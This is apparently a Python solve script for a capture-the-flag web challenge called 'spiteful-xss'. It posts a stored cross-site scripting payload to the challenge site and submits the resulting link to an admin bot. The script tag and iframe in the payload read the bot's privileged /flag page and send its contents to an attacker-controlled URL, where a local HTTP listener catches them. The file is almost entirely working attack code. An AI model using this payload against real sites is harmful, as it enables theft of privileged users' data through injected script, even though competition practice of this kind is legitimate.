#!/usr/bin/env python3
import requests
import sys
import http.server
import threading

flag_prefix = 'flag{'
challenge_url = 'https://spiteful-xss.acmcyber.com'
bot_url = 'https://admin-bot.acmcyber.com/spiteful-xss'


class GetHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if flag_prefix in self.path:
            print("Flag found:", self.path)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'thx for flag')
            exit(0)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'thx for visiting')


def start_server():
    server_address = ('localhost', 8000)
    httpd = http.server.HTTPServer(server_address, GetHandler)
    httpd.serve_forever()


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <local-url>")
        exit(-1)

    payload = """
<script>
function onMyFrameLoad() {
  window.location="{URL}?flag="+document.getElementsByTagName('iframe')[0].contentDocument.children[0].children[1].innerHTML
};
</script>

<iframe src="https://spiteful-xss.acmcyber.com/flag" onload="onMyFrameLoad(this)"></iframe>
"""

    payload = payload.replace("{URL}", sys.argv[1])

    print('Starting server...')
    thread = threading.Thread(target=start_server)
    thread.daemon = True
    thread.start()
    print('Server started.')

    print('Sending payload...')
    r = requests.post(challenge_url+'/post',
                      data={'content': payload}, allow_redirects=False)
    saved_post = r.headers['Location']

    print('Sending url to bot...')
    r = requests.post(bot_url, data={'url': challenge_url + saved_post})

    while thread.is_alive():
        pass
